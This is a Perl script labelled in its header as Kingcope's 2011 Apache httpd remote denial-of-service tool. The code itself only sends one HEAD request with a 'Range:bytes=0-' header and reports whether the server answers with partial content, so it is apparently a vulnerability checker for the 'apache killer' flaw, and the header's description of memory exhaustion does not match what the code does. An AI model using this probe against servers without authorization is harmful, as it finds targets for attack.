#Apache httpd Remote Denial of Service (memory exhaustion)
#By Kingcope
#Year 2011
#
# Will result in swapping memory to filesystem on the remote side
# plus killing of processes when running out of swap space.
# Remote System becomes unstable.
#

use strict;
use warnings;
use FindBin;
use Locale::Maketext::Simple Style => 'gettext', Path => $FindBin::Bin;
use IO::Socket;

sub usage {
	print "Apache Remote Denial of Service (memory exhaustion)\n";
	print "by Kingcope\n";
	print "usage: perl $0 <url> <IP address>\n";
	print "example: perl $0 'http://www.example.com:8080/images/sample1.jpg'\n";
}

sub urlPearse {
	my ( $url )	= @_;
	$url		=~ /(http[s]?:)?(\/\/)?([^:\/]*)?(:([0-9]+))?(\/.*)?/;

	my $urlHost	= "localhost";
	if(defined $3) {$urlHost = $3;}

	my $urlPort	= 80;
	if(defined $5) {$urlPort = $5;}

	my $urlPath = "/";
	if (defined $6) {$urlPath = $6;}

	return ( $urlHost, $urlPort, $urlPath );
}

sub testapache {
	my ( $host, $port, $urlHost, $path ) = @_;
	print "Connect $host:$port\n";
	my $sock	= IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port, Proto => 'tcp') or die $!;
	my $p		= "HEAD $path HTTP/1.1\r\nHost: $urlHost\r\nRange:bytes=0-\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
	print $sock $p;

#	while(<$sock>) {
#		warn $_;
#	}

	my $x = <$sock>;
	if ($x =~ /Partial/) {
		return 1;	
	}
	else {
		return 0;
	}
}

my $host		= "localhost";
my $urlHost		= "localhost";
my $port		= 80;
my $path		= "/";
my $url			= "http://localhost";

if ($#ARGV < 0) {
	usage;
	exit;	
}

if ($#ARGV >= 0) {
	($urlHost, $port, $path)		= urlPearse($ARGV[0]);
}
$host			= ( $#ARGV >= 1 ? $ARGV[1] : $urlHost );

if (testapache( $host, $port, $urlHost, $path ) == 0) {
	printf("OK:%s\n", loc( "Host does not seem vulnerable" ));
}
else {
	printf("NG:%s\n", loc( "The host is vulnerable to apache killer" ));
}
exit;	
